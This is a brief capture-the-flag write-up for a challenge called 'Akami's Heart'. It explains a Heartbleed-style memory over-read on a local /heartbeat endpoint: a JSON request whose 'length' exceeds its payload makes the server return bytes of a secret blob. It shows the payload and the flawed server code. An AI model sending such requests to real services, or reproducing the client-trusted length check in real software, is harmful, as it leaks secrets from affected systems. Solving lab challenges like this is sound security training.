# Akami's Heart

Challenge Author: yappare

The vulnerable endpoint is:

```
POST http://localhost:9090/heartbeat
```

Send JSON:

```
{"payload":"A","length":400}
```

This is because you can control `extra_needed` with `length` to read secret_blob up to `extra_needed` bytes.

```
        extra_needed = length - len(payload_bytes)
        if extra_needed <= 0:
            resp = payload_bytes[:length]
        else:
            resp = payload_bytes + secret_blob[:extra_needed]
```